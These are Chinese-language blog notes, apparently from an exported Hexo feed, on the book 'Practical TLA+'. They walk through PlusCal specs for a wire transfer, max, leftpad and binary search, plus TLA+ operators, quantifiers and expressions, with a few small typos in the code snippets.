<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Integers  *\单行注释用这个</span><br><span class="line">**注释块用这个**</span><br><span class="line">**导入块之后可以继续写我们的算法框架**</span><br><span class="line">(*--algorithm wire</span><br><span class="line"></span><br><span class="line">begin</span><br><span class="line">	skip;</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<p>​    然后我们来进一步具体化，从题目中很显然可以看到两个变量，即人和他们的账户，所以我们需要声明变量，这里假定每个人都有五块钱</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Intergers</span><br><span class="line">(*--algorithm wire</span><br><span class="line">	variables</span><br><span class="line">		people=&#123;&quot;alice&quot;,&quot;bob&quot;&#125;,</span><br><span class="line">		acc=[p \in people |-&gt; 5];</span><br><span class="line">		**等同于acc[&quot;alice&quot;]=acc[&quot;bob&quot;]=5**</span><br><span class="line">begin</span><br><span class="line">	skip;</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<p>​    现在来解释一下上面的代码，people是声明的一个集合，没什么好说的。对于acc，这是一个<strong>函数</strong>，但是不等同于传统的函数，它更接近于一个字典，对于给出的集合中的每一个值，都有一个相应的输出值，在这里的集合是people，元素是p，类似于python中的{“alice”:5,”bob”:5}</p>
<p>​    接下来我们继续去搭建这条线，可以继续指定变量，最后我们需要的就是设置一些不变量，不管在什么时候都需要为真，这里的”==”是一个<strong>操作</strong>，而不是指的比较，而对于这个常量的表述，就满足了我们上面的所有账户的值非负的要求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">variables</span><br><span class="line">	peoples=&#123;&quot;alice&quot;,&quot;bob&quot;&#125;</span><br><span class="line">	acc=[p \in people |-&gt; 5];</span><br><span class="line">	sender=&quot;alice&quot;,</span><br><span class="line">	receiver=&quot;bob&quot;,</span><br><span class="line">	amount=3;</span><br><span class="line">define</span><br><span class="line">	NoOverdrafts == \A p \in people: acc[p] &gt;= 0</span><br><span class="line">end define;</span><br></pre></td></tr></table></figure>
<p>​    现在我们定义好的变量和常量，我们接下来需要在begin和end中间添加相关的算法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin</span><br><span class="line">	Withdraw:</span><br><span class="line">		acc[sender] := acc[sender]-amount;</span><br><span class="line">	Deposit:</span><br><span class="line">		acc[receiver] := acc[receiver]+amount;</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>​    现在进行一些对上面的解释，如果是第一次给变量分配一个值，需要用=，如果变量已经存在而需要给他分配一个新值，则用:=。上面的Withdraw和Deposit是两个<strong>标签</strong>，这代表着他们之中的部分会同时发生</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>​    这里给出的验证方法是通过验证不变量是否正确开始的，我们需要创建一个model，即在<strong>TLC Model Checker</strong>中找到<strong>New Model</strong>，然后在页面的<strong>Invariants</strong>中添加新的核查量即可，接着就可以运行了，由于我们的问题不算复杂，一共经历了如下的过程：</p>
<pre><code>1. 选择一个可能的初始状态，现在只有一种
2. 检查初状态的不变量的值，然后如果满足就继续执行**Withdraw**步骤
3. 检查不变量的值，为真就继续执行
4. 进行**Deposit**步骤
5. 检查不变量的值，如果满足的话，就结束
</code></pre><p>​    如果在这个过程中出现任何错误的话，就会直接跳出程序</p>
<h3 id="增加初始化"><a href="#增加初始化" class="headerlink" title="增加初始化"></a>增加初始化</h3><p>​    上面的例子显然太简单了，只能有一种对应的输入，我们来增加一些更多的选择</p>
<ol>
<li><p>TLA+使用a..b来表示a到b的整数，也就是说可以对上述代码中的amount做如下改变，显然这个时候再次运行model的话会报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amount \in 1..6;</span><br></pre></td></tr></table></figure>
</li>
<li><p>当然我们可以通过如下的改动来使他不报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amount \in 1..acc[sender];</span><br></pre></td></tr></table></figure>
<p>但是这样明显违背了商家的本意，我们可以假设这是可以接受的，进行更改并确认模型再次通过</p>
</li>
</ol>
<h3 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h3><p>​    在Pluscal中，每一个算法在他自己独特的进程中同时发生，每一个进程有着他自己的变量和代码，然后就可以根据下面的方法创建多进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Intergers</span><br><span class="line">(*--algorithm wire</span><br><span class="line">variables</span><br><span class="line">	people=&#123;&quot;alice&quot;,&quot;bob&quot;&#125;,</span><br><span class="line">	acc=[p \in people |-&gt; 5];</span><br><span class="line">define</span><br><span class="line">	NoOverdrafts == \A p \in people: a[p]&gt;=0</span><br><span class="line">end define;</span><br><span class="line">process Wire \in 1..2</span><br><span class="line">	variables</span><br><span class="line">		sender=&quot;alice&quot;,</span><br><span class="line">		receiver=&quot;bob&quot;,</span><br><span class="line">		amount \in 1..acc[sender];</span><br><span class="line">begin</span><br><span class="line">	Withdraw:</span><br><span class="line">		acc[sender]:=acc[sender]-amount;</span><br><span class="line">	Deposit:</span><br><span class="line">		acc[receiver]:=acc[receiver]-amount;</span><br><span class="line">end process;</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<p>​    如果我们重新翻译重新运行上述程序，仍然会报错，由于多进程的缘故，在执行了两次Withdraw后，仍然有可能出错，也就是我们只需要在执行之前做一个判断即可，这就是<strong>if</strong>语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin</span><br><span class="line">CheckFunds:</span><br><span class="line">	if amount&lt;=acc[sender] then</span><br><span class="line">    	**algorithm**</span><br><span class="line">    end if;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    但是这样竟然仍然会报错！这个时候的错误似乎没有那么明显，我们需要在Error-Trace中找到错误原因</p>
<p>​    打开Error-Trace，他直接从每一步开始给出了错误的原因，这里的bug是因为两个进程同时发生导致的，我们可以将withdraw和check放在一起来防止这种错误的发生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin</span><br><span class="line">CheckFunds:</span><br><span class="line">	if amount&lt;=acc[sender] then acc[sender]:=acc[sender]-amount;</span><br><span class="line">	Deposit:</span><br><span class="line">		acc[receiver]:=acc[receiver]-amount;</span><br><span class="line">    end if;</span><br><span class="line">end process;</span><br></pre></td></tr></table></figure>
<p>​    这里简单解释一下，对于多进程的同时性，是值得两个进程在同时完成了某一步，在上面那种报错的写法后，第一个进程进行完check后，准备进行withdraw，这个时候acc[sender]的值未改变，所以第二个进程的check也没问题，这样就出错了。而在上述正确的写法中，在进程一的check步骤结束后acc[sender]已经发生改变，第二个进程就会报错</p>
<p>​    一定要注意理解什么叫做多进程与他的并发性！</p>
<h3 id="时间属性"><a href="#时间属性" class="headerlink" title="时间属性"></a>时间属性</h3><p>​    现在我们来完成接下来的要求，即如果电汇失败，账户不会改变。我们容易知道有一个更弱的条件，即电汇前后账户总额保持不变。这个不变量和之前的NoOverdrafts不同，他是一个<strong>时间属性</strong></p>
<p>​    不变量检查是检查每个状态是否有效，而时间属性检查的是算法的每个可能的生命周期，从开始到结束，都遵守所需要的某个规则，我们加上这一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">define</span><br><span class="line">	NoOverdrafts == \A p \in people:acc[p]&gt;=0</span><br><span class="line">	EventuallyConsistent == &lt;&gt;[](acc[&quot;alice&quot;]+acc[&quot;bob&quot;]=10)</span><br><span class="line">end define;</span><br></pre></td></tr></table></figure>
<p>​    上面的<strong>EventuallyConsistent</strong>和NoOverdrafts差不多，但是以<strong>&lt;&gt;[]</strong>开始，它是一种时间属性的算子，意味着不管算法是怎样的，在最后所给的等式必须为真，但是中间过程的真假是无所谓的，然后我们可以在<strong>Model</strong>中继续加入时间属性来进行验证</p>
<p>​    运行一下，会发现程序报错，整体的流程上没有什么错误，但是在error-trace的最后有了标签<strong>Stuttering</strong>，这个标签代表着这个过程只是简单地停止了，没有东西阻止他继续应该进行的deposit，他只是自己不再尝试了，<strong><del>这看起来好牵强</del></strong>，但是事实上是有迹可循的，有可能是服务器在步骤之间崩溃，有可能是停电了，也有可能发生了其他的不可预知的情况，这些情况都是以<strong>Stuttering</strong>状态呈现的</p>
<p>​    然而，对于这种错误，很难有什么比较好的方法去修正，我们可以从以下的几个方面考虑</p>
<ol>
<li>我们可以将check、withdraw、deposit合成为一个步骤，减少他们中间的步骤的时间跨度，防止在步骤之间崩溃，但是这导致我们的流程中只有一个标签，实际的运行时间为0，违反了电汇占用任意时间的核心要求</li>
<li>我们可以明确告诉TLA+，我们的程序不能断断续续，这样做的话我们的spec会通过，但是我们不能实现它，服务器仍会故障</li>
<li>说服项目经历放宽最终的要求</li>
<li>尝试不同的实现</li>
<li>放宽NoOverdrafts要求，事实上在很多地方都是这样做的</li>
</ol>
<p>​    很显然更改这样的一个error是非常复杂的，但是目前这里不作为我们的重点考虑</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    这一章从一个简单的样例入手，讲述了TLA+的基本概念和一些简单地语法，以及对于model的使用，由于只是一个引入，所以不用花费太多的精力，重点就在于一些全新的概念，另外就是对于多进程大致有了一个印象</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical-TLA+》阅读笔记（七）</title>
    <url>/2021/09/24/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    看标题是和算法相关的。</p>
<p>​    首先，TLA+中的操作相比于函数，他显然“更强”，这意味着有时候我们可能难以将他，<del>这也是我在敲TLA+时候的一个疑惑</del>，当然很多时候其实很难写出这样的强力操作。</p>
<p>​    这一章主要是用来<strong>证明</strong>一些算法，注意重点是证明而不是实现。</p>
<p>​    另外就是有一个前提，就是我们讨论的所有算法最终都会终止。</p>
<h2 id="一个单进程算法"><a href="#一个单进程算法" class="headerlink" title="一个单进程算法"></a>一个单进程算法</h2><p>​    下面给一个验证这种算法的通用模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">----- MODULE single_process_agrithom ----</span><br><span class="line">EXTENDS \* whatever</span><br><span class="line">Expected(input) == \* ...</span><br><span class="line">Helpers == \* ...</span><br><span class="line">(*--algorithm name</span><br><span class="line">variables</span><br><span class="line">	input \in \* ...</span><br><span class="line">	output; \* ... </span><br><span class="line">	\* helper variables</span><br><span class="line">begin</span><br><span class="line">	\*algorithm implementation</span><br><span class="line">	assert output=Expected(input);</span><br><span class="line">end algorithm; *)</span><br><span class="line">=====</span><br></pre></td></tr></table></figure>
<p>​    其实代码还是非常清晰明了的。</p>
<p>​    另外值得注意的是，我们不需要给output赋值，TLC将会创建常量<strong>DefaultInitValue &lt;- [model constant]</strong>，在这里会初始化output，另外这里也可以放一些辅助变量，毕竟在算法中的begin和end之间我们一般是不能定义新变量的。</p>
<p>​    下面给一个新的例子，<del>就是一个求和，宛如智障</del></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Integers,TLC</span><br><span class="line">add(a,b) == a + b</span><br><span class="line">(*--algorithm add</span><br><span class="line">variables</span><br><span class="line">    in_a \in -5..5,</span><br><span class="line">    in_b \in -5..5,</span><br><span class="line">    output;</span><br><span class="line">begin</span><br><span class="line">    output := in_a+in_b;</span><br><span class="line">    assert output = add(in_a,in_b);</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<h2 id="Max"><a href="#Max" class="headerlink" title="Max"></a>Max</h2><p>​    我们现有的已知求最大值算法就是用<strong>CHOOSE</strong>命令，从所有的里面进行选择，也可以进行循环，Pluscal代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Integers, Sequences, TLC</span><br><span class="line">CONSTANTS IntSet, MaxSeqLen</span><br><span class="line">ASSUME IntSet \subseteq Int</span><br><span class="line">ASSUME MaxSeqLen &gt; 0</span><br><span class="line">PT == INSTANCE PT</span><br><span class="line">Max(seq) ==</span><br><span class="line"> LET set == &#123;seq[i]: i \in 1..Len(seq)&#125;</span><br><span class="line"> IN CHOOSE x \in set: \A y \in set: y &lt;= x</span><br><span class="line">AllInputs == PT!SeqOf(IntSet, MaxSeqLen) \ &#123;&lt;&lt;&gt;&gt;&#125;</span><br><span class="line">(*--algorithm max</span><br><span class="line">variables seq \in AllInputs, i = 1, max;</span><br><span class="line">begin</span><br><span class="line"> assert Len(seq) &gt; 0;</span><br><span class="line"> max := seq[1];</span><br><span class="line"> while i &lt;= Len(seq) do</span><br><span class="line"> if max &lt; seq[i] then</span><br><span class="line"> max := seq[i];</span><br><span class="line"> end if;</span><br><span class="line"> i := i + 1;</span><br><span class="line"> end while;</span><br><span class="line"> assert max = Max(seq);</span><br><span class="line">end algorithm; *)</span><br></pre></td></tr></table></figure>
<p>​    注意其实最开始程序会报错，因为有可能会出现空列表，我们在生成的时候做限制即可。</p>
<h2 id="Leftpad"><a href="#Leftpad" class="headerlink" title="Leftpad"></a>Leftpad</h2><p>​    其实就是个字符串填充的问题，非常简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------------------------ MODULE Leftpad ------------------------------</span><br><span class="line">EXTENDS TLC,Integers,Sequences</span><br><span class="line">PT == INSTANCE PT</span><br><span class="line">Leftpad(c, n, str) ==</span><br><span class="line"> LET</span><br><span class="line"> outlength == PT!Max(Len(str), n)</span><br><span class="line"> padlength ==</span><br><span class="line"> CHOOSE padlength \in 0..n:</span><br><span class="line"> padlength + Len(str) = outlength</span><br><span class="line"> IN</span><br><span class="line"> [x \in 1..padlength |-&gt; c] \o str</span><br><span class="line">Characters == &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;</span><br><span class="line">(*--algorithm leftpad</span><br><span class="line">variables</span><br><span class="line"> in_c \in Characters \union &#123;&quot; &quot;&#125;,</span><br><span class="line"> in_n \in 0..6,</span><br><span class="line"> in_str \in PT!SeqOf(Characters, 6),</span><br><span class="line"> output;</span><br><span class="line">begin</span><br><span class="line"> output := in_str;</span><br><span class="line"> while Len(output) &lt; in_n do</span><br><span class="line"> output := &lt;&lt;in_c&gt;&gt; \o output;</span><br><span class="line"> end while;</span><br><span class="line"> assert output = Leftpad(in_c, in_n, in_str);</span><br><span class="line">end algorithm; *)</span><br><span class="line">\* BEGIN TRANSLATION (chksum(pcal) = &quot;42773a97&quot; /\ chksum(tla) = &quot;eaf0c402&quot;)</span><br><span class="line">CONSTANT defaultInitValue</span><br><span class="line">VARIABLES in_c, in_n, in_str, output, pc</span><br><span class="line"></span><br><span class="line">vars == &lt;&lt; in_c, in_n, in_str, output, pc &gt;&gt;</span><br><span class="line"></span><br><span class="line">Init == (* Global variables *)</span><br><span class="line">        /\ in_c \in (Characters \union &#123;&quot; &quot;&#125;)</span><br><span class="line">        /\ in_n \in 0..6</span><br><span class="line">        /\ in_str \in PT!SeqOf(Characters, 6)</span><br><span class="line">        /\ output = defaultInitValue</span><br><span class="line">        /\ pc = &quot;Lbl_1&quot;</span><br><span class="line"></span><br><span class="line">Lbl_1 == /\ pc = &quot;Lbl_1&quot;</span><br><span class="line">         /\ output&#x27; = in_str</span><br><span class="line">         /\ pc&#x27; = &quot;Lbl_2&quot;</span><br><span class="line">         /\ UNCHANGED &lt;&lt; in_c, in_n, in_str &gt;&gt;</span><br><span class="line"></span><br><span class="line">Lbl_2 == /\ pc = &quot;Lbl_2&quot;</span><br><span class="line">         /\ IF Len(output) &lt; in_n</span><br><span class="line">               THEN /\ output&#x27; = &lt;&lt;in_c&gt;&gt; \o output</span><br><span class="line">                    /\ pc&#x27; = &quot;Lbl_2&quot;</span><br><span class="line">               ELSE /\ Assert(output = Leftpad(in_c, in_n, in_str), </span><br><span class="line">                              &quot;Failure of assertion at line 24, column 2.&quot;)</span><br><span class="line">                    /\ pc&#x27; = &quot;Done&quot;</span><br><span class="line">                    /\ UNCHANGED output</span><br><span class="line">         /\ UNCHANGED &lt;&lt; in_c, in_n, in_str &gt;&gt;</span><br><span class="line"></span><br><span class="line">(* Allow infinite stuttering to prevent deadlock on termination. *)</span><br><span class="line">Terminating == pc = &quot;Done&quot; /\ UNCHANGED vars</span><br><span class="line"></span><br><span class="line">Next == Lbl_1 \/ Lbl_2</span><br><span class="line">           \/ Terminating</span><br><span class="line"></span><br><span class="line">Spec == Init /\ [][Next]_vars</span><br><span class="line"></span><br><span class="line">Termination == &lt;&gt;(pc = &quot;Done&quot;)</span><br><span class="line"></span><br><span class="line">\* END TRANSLATION </span><br><span class="line">=============================================================================</span><br><span class="line">\* Modification History</span><br><span class="line">\* Last modified Sat Sep 25 09:35:02 CST 2021 by yx7</span><br><span class="line">\* Created Sat Sep 25 09:14:09 CST 2021 by yx7</span><br></pre></td></tr></table></figure>
<h1 id="算法的特性"><a href="#算法的特性" class="headerlink" title="算法的特性"></a>算法的特性</h1><p>​    测定算法的正确性是最为简单的，现在我们期望测定算法的性能特征和界限，为了实现这一点，可以加入一些辅助变量，这里以二分查找为例，来检测算法的性能。</p>
<p>​    其实就是在循环中加一个辅助变量来记录重复的次数<del>感觉好low</del>，这里大概就是去衡量最坏的时间复杂度，最佳时间复杂度和平均时间复杂度难以被衡量，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXTENDS Integers,TLC,Sequences</span><br><span class="line">PT == INSTANCE PT</span><br><span class="line">OrderedSeqOf(set,n) == </span><br><span class="line">    &#123; seq \in PT!SeqOf(set,n):</span><br><span class="line">      \A x \in 2..Len(seq):</span><br><span class="line">       seq[x]&gt;=seq[x-1]&#125;</span><br><span class="line">Pow2(n) ==</span><br><span class="line">    LET f[x \in 0..n] ==</span><br><span class="line">        IF x = 0</span><br><span class="line">        THEN 1</span><br><span class="line">        ELSE 2*f[x-1]</span><br><span class="line">    IN f[n]</span><br><span class="line">MaxInt == 4</span><br><span class="line">Range(f) == &#123;f[x]: x \in DOMAIN f&#125;</span><br><span class="line">(*--algorithm bs</span><br><span class="line">variables low=1,</span><br><span class="line">          seq \in OrderedSeqOf(1..MaxInt,MaxInt),</span><br><span class="line">          target \in 1..MaxInt,</span><br><span class="line">          high = Len(seq),</span><br><span class="line">          found_index = 0,</span><br><span class="line">          counter = 0;</span><br><span class="line">begin</span><br><span class="line">    Search:</span><br><span class="line">        while low &lt;= high do</span><br><span class="line">            counter := counter + 1;</span><br><span class="line">            with</span><br><span class="line">                mid=(high+low) \div 2</span><br><span class="line">            do</span><br><span class="line">                if seq[mid] = target then</span><br><span class="line">                    found_index := mid;</span><br><span class="line">                    goto Result;</span><br><span class="line">                elsif seq[mid] &gt; target then</span><br><span class="line">                    high := mid-1;</span><br><span class="line">                else</span><br><span class="line">                    low := mid+1;</span><br><span class="line">                end if;</span><br><span class="line">            end with;</span><br><span class="line">        end while;</span><br><span class="line">    Result:</span><br><span class="line">        if Len(seq) &gt; 0 then</span><br><span class="line">            assert Pow2(counter-1) &lt;= Len(seq);</span><br><span class="line">        end if;</span><br><span class="line">        if target \in PT!Range(seq) then</span><br><span class="line">            assert seq[found_index] =target;</span><br><span class="line">        else</span><br><span class="line">            assert found_index = 0;</span><br><span class="line">        end if;</span><br><span class="line">end algorithm;*)</span><br></pre></td></tr></table></figure>
<p>​    另外值得一提的是，在计算平均值的时候，有可能超过了设备允许的范围，如果我们加一个求和的判定，就会出错，这里就要沿用另外一种写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">with</span><br><span class="line"> lh = high - low,</span><br><span class="line"> m = high - (lh \div 2)</span><br><span class="line">do</span><br></pre></td></tr></table></figure>
<h1 id="多进程算法"><a href="#多进程算法" class="headerlink" title="多进程算法"></a>多进程算法</h1><p>​    这里其实和单一进程的没有什么区别，为了检查结果为真，我们需要使用前文提到过的<strong>&lt;&gt;[]</strong>，另外就是如果不想让算法中途崩溃，可以使用公平进程</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    这一章主要就是来验证算法的正确性和另外的一些特性，仅此而已，下一章将会介绍一部分数据结构。</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical TLA+》阅读笔记（三）</title>
    <url>/2021/08/25/%E3%80%8APractical-TLA+%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    这一章主要介绍<strong>TLA+ proper</strong>并且用它来写一些更加复杂的不变量</p>
<h1 id="Operators"><a href="#Operators" class="headerlink" title="Operators"></a>Operators</h1><p>​    在这里我们可以自行的写一些操作，大概是这样的格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Op(arg1, arg2) == Expr</span><br></pre></td></tr></table></figure>
<p>​    注意这里要写两个等于号，如果不需要参数的话可以直接用类似于赋值的写法，我们可以简化之前那个分类的程序，感觉其实还是类似于直接定义一个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BinTypes == &#123;&quot;trash&quot;, &quot;recycle&quot;&#125;</span><br><span class="line">SetsOfFour(set) == set \X set \X set \X set</span><br><span class="line">Items == [type: BinTypes, size: 1..6]</span><br><span class="line">(* --algorithm recycler</span><br><span class="line">variables</span><br><span class="line">	capacity \* ...</span><br><span class="line">	items \in SetsOfFour(Items);</span><br><span class="line">	*\...)</span><br></pre></td></tr></table></figure>
<p>​    这里这么定义其实也没有简化多少，但是是有一定好处的，因为我们把可能的物品构成的集合当成了一个常量而非变量，这个时候就比较适合将它定义成一个操作，从而防止在算法中不小心改变了这个集合。</p>
<p>​    另外就是在定义时，TLA+不适用分号，而PlusCal使用分号。如果想要用PlusCal声明的变量定义操作的话，应该放在define之中，<strong>另外就是它的定义一定要在variable之后，在macro之前</strong>，然后就是在<strong>TLA+中唯一一个对于缩进敏感的地方</strong>，也就是定义操作时的结合问题，比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/\ A</span><br><span class="line">/\B</span><br><span class="line">	\/C</span><br><span class="line">/\D</span><br></pre></td></tr></table></figure>
<p>​    我们得到的是A/(B\/C)/\D</p>
<p>​    另外需要说一下的就是操作的嵌套，最大的操作也称之为<strong>higher-order operators</strong>，需要提前声明所有它用过的操作，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add(a,b) == a+b</span><br><span class="line">Apply(op(_,_),x,y) == op(x,y)</span><br><span class="line">\*  example</span><br><span class="line">Apply(Add,1,2)   -&gt;     3</span><br></pre></td></tr></table></figure>
<p>​    可以用LAMBDA定义一些匿名的操作，匿名操作（Anonymous operators）只能作为参数被其它操作使用，不能单独使用，写法正如LAMBDA param1, param2, paramN: body</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apply(LAMBDA x,y: x+y, 1, 2)</span><br></pre></td></tr></table></figure>
<p>​    最后可以通过自定义操作来让语句更短</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set ++ elem == set \union &#123;elem&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Invariants"><a href="#Invariants" class="headerlink" title="Invariants"></a>Invariants</h1><p>​    我们不需要定义一个单独的操作来声明一个不变量，但是这样做可以增加可读性</p>
<h2 id="Logical-Operators"><a href="#Logical-Operators" class="headerlink" title="Logical Operators"></a>Logical Operators</h2><h3 id="A-and-E"><a href="#A-and-E" class="headerlink" title="\A and \E"></a>\A and \E</h3><p>​    \A意味着”all elements in a set”，通常的格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\A x \in set: P(x)</span><br><span class="line">\*意为，对于集合中的所有元素，P(x)为真，下面给一个例子</span><br><span class="line">AllLessThan(set, max) == \A num \in set: num&lt;max</span><br><span class="line">\*如</span><br><span class="line">AllLessThan(&#123;1,3&#125;,4)  ---&gt;   TRUE</span><br></pre></td></tr></table></figure>
<p>​    \E意味着”there exists some element in the set”，通常的格式为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\E x \in set: P(x)</span><br><span class="line">\* 意为在集合中至少有一个元素使P(x)为真，下面给一个例子</span><br><span class="line">\* SeqOverlapsSet(seq, set) == \E x \in 1..Len(seq): seq[x] \in set</span><br><span class="line">\* 如</span><br><span class="line">SeqOverlapsSet(&lt;&lt;1,3&gt;&gt;,&#123;2,3,4&#125;) --&gt; TRUE</span><br></pre></td></tr></table></figure>
<p>​    另外就是如果集合为空，那么\E恒为FALSE，\A恒为TRUE，也可以在这两个量词前加否定，即~\E表示”there is no element in the set”，另外~\A表示”not all elements in the set”</p>
<p>​    如果参数的顺序不影响操作的话，我们称之为”commutative operator”，如果我们想要查看它是不是的话，就需要测试集合中的所有的值对，可以通过上面的量词来达到这一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IsCommutativeOver(Op(_,_),S)==</span><br><span class="line">	\A x,y \in S: Op(x,y) = Op(y,x)</span><br><span class="line">\* 还有别的写法</span><br><span class="line">IsCommutativeOver(Op(_, _), S) ==</span><br><span class="line">	\A x \in S, y \in S: Op(x, y) = Op(y, x)</span><br><span class="line">\* 还有</span><br><span class="line">IsCommutativeOver(Op(_, _), S) ==</span><br><span class="line">	\A &lt;&lt;x, y&gt;&gt; \in S \X S: Op(x, y) = Op(y, x)</span><br><span class="line">\* 例如</span><br><span class="line">IsCommutativeOver(Lambda x,y: x+y,1..10)</span><br><span class="line">TRUE</span><br><span class="line">IsCommutativeOver(Lambda x,y: x-y,1..10)</span><br><span class="line">FALSE</span><br></pre></td></tr></table></figure>
<h3 id="gt-and-lt-gt"><a href="#gt-and-lt-gt" class="headerlink" title="=&gt; and &lt;=&gt;"></a>=&gt; and &lt;=&gt;</h3><p>​    这里和命题的等价公式还挺像的</p>
<p>​    P=&gt;Q means that if P is true, then Q is true，这等价于~P\/Q，一般来说这个会用在当预条件满足时检查某事是否发生</p>
<p>​    P&lt;=&gt;Q </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Xor(A,B) == (~A/\B)\/(A/\~B)</span><br><span class="line">OtherXor(A,B) == ~A &lt;=&gt; B</span><br><span class="line">\ A A \in BOOLEAN,B \IN BOOLEAN: Xor(A,B) = OtherXor(A,B)</span><br></pre></td></tr></table></figure>
<p>另外需要注意的就是这里也对空白敏感</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/\ P</span><br><span class="line">/\ Q		--&gt;  (P/\Q) =&gt; R</span><br><span class="line">=&gt; R</span><br><span class="line"></span><br><span class="line">/\ P</span><br><span class="line">/\ Q		--&gt;  P/\(Q=&gt; R)</span><br><span class="line">  =&gt; R</span><br></pre></td></tr></table></figure>
<h2 id="Expressions"><a href="#Expressions" class="headerlink" title="Expressions"></a>Expressions</h2><p>​    以下的这些东西自由度很高，可以在任何表达中使用</p>
<h3 id="LET-IN"><a href="#LET-IN" class="headerlink" title="LET-IN"></a>LET-IN</h3><p>​    所有的表达都可以使用LET-IN 来一些操作和定义，<del>不过暂时不太理解这个东西的好处在哪里</del>，或许好在局部操作？现在大概明白了，这里IN后面跟的是返回值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RotateRight(seq) == </span><br><span class="line">	LET</span><br><span class="line">		last == seq[Len(seq)]</span><br><span class="line">		first == SubSeq(seq, 1, Len(seq)-1)</span><br><span class="line">	IN &lt;&lt;last&gt;&gt; \o first</span><br><span class="line"></span><br><span class="line">&gt;&gt; RotateRight(&lt;&lt;1,2,3&gt;&gt;)</span><br><span class="line">&lt;&lt;3,1,2&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="IF-THEN-ELSE"><a href="#IF-THEN-ELSE" class="headerlink" title="IF-THEN-ELSE"></a>IF-THEN-ELSE</h3><p>​    所有if的表达都必须要有else，这是一个表达而非语法格式，内部不能赋值，但是PlusCal可以在内部赋值而不能将其赋给别的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Max(x,y) == IF x&gt;y THEN x ELSE y</span><br><span class="line">&gt;&gt; &lt;&lt;Max(2,3),Max(3,2)&gt;&gt;</span><br><span class="line">&lt;&lt;3,3&gt;&gt;</span><br></pre></td></tr></table></figure>
<h3 id="CASE"><a href="#CASE" class="headerlink" title="CASE"></a>CASE</h3><p>​    case的子列用中括号来标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CASE x = 1 -&gt; TRUE</span><br><span class="line">  [] x = 2 -&gt; TRUE</span><br><span class="line">  [] x = 3 -&gt; 7</span><br><span class="line">  [] OTHER -&gt; FALSE</span><br></pre></td></tr></table></figure>
<p>​    必须要有最后的OTHER，否则会报错，然后就是允许多个陈述都比配，但是尽量避免这种情况</p>
<h3 id="CHOOSE"><a href="#CHOOSE" class="headerlink" title="CHOOSE"></a>CHOOSE</h3><p>​    <strong>这个比较重要！！！</strong></p>
<p>​    CHOOSE x \in S : P(x)指的是”select an x such that P(x) is TRUE”，如果超过一个，会任意返回一个，如果一个都没有，会报错</p>
